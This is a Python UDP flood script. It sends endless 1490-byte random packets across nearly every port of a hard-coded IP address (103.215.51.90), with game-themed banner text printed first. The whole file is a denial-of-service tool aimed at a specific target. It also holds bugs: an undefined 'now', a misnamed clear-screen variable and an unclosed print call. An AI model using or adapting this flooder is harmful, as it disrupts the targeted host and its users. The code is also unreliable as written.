
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 1


# Starting working.
os.system(cmd_clear)
print('\033[1;34mTo all of my children in whom Life flows abundant...')
time.sleep(1)
print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
time.sleep(1)
print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
time.sleep(1)
print('\033[1;34mLook to those who walked before to lead those who walk after...')
time.sleep(1)
print('')
time.sleep(1)
print('\033[1;34mHear...Feel...Think...')
time.sleep(2)
print('\033[0m-----------------------------------')
time.sleep(1)
print('\033[1;36m/ac Reflect <wait.3>')
time.sleep(1)
print('\033[1;36m/ac Manipulation <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Great Strides <wait.2>')
time.sleep(1)
print("\033[1;36m/ac Byregot's Blessing <wait.3>")
time.sleep(1)
print('\033[1;36m/ac Great Veneration <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Groundwork <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Groundwork')
time.sleep(1)

sent = 0
i = 600
timeR = i + random.randint(0,20)
dtime = now.strftime("%Y-%m-%d %H:%M:%S")

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1
                print('\033[%s]Sented 65535 packets to 103.215.51.90 through port:All\033[0m'%(dtime)
                print('\033[1;36m/wait %s'%(timeR))
                time.sleep(timeR)
                

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (str("103.215.51.90"), port))
            sent += 1
            port += 1
            timeR = i + random.randint(0,20)
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            
    except:
        print('\n\033[31;1mExited\033[0m')

